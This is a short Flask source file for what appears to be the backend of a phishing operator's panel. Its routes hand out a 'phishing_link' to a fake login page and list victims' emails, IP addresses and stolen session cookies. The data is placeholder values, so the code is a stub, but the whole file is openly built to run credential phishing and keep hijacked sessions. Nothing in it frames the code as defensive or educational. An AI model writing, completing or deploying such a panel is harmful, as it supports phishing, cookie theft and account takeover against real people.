from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/generate', methods=['POST'])
def generate_link():
    phishing_link = "http://your-domain.com/login"
    return jsonify({"link": phishing_link})

@app.route('/api/sessions', methods=['GET'])
def get_sessions():
    sessions = [{"email": "victim@example.com", "ip": "192.168.1.1", "time": "2025-01-30"}]
    return jsonify(sessions)

@app.route('/api/cookies', methods=['GET'])
def get_cookies():
    cookies = [{"email": "victim@example.com", "cookie": "session=xyz123"}]
    return jsonify(cookies)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
